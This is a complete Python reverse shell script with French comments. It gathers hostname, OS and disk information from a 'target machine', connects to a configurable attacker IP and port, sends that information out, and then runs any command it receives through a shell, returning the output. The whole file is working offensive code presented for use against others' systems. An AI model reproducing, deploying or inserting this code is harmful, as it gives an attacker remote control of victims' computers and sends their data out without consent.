import socket
import os
import platform
import subprocess

def get_system_info():
    """Collecte les informations sur la machine cible."""
    info = {}
    info["Hostname"] = socket.gethostname()
    info["System"] = platform.system()
    info["Version"] = platform.version()
    info["Release"] = platform.release()
    info["Architecture"] = platform.architecture()[0]
    
    # Collecte des disques durs
    if platform.system() == "Windows":
        drives = subprocess.check_output("wmic logicaldisk get caption", shell=True)
        info["Drives"] = drives.decode().split("\n")[1:-1]
    else:
        info["Drives"] = subprocess.getoutput("df -h | awk '{print $1}'").split("\n")
    
    return info

def main():
    # Remplacez ces valeurs par l'adresse IP et le port de votre machine attaquante
    host = "192.168.1.123"  
    port = 4444

    # Établir la connexion au serveur
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"[+] Connection established\n")
        
        # Envoi des informations sur la machine cible
        system_info = get_system_info()
        for key, value in system_info.items():
            s.send(f"{key}: {value}\n".encode())
        
        # Boucle pour recevoir et exécuter des commandes
        while True:
            command = s.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(f"Changed directory to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"Error: {str(e)}\n".encode())
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error executing command: {str(e)}\n".encode())
        
        s.close()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
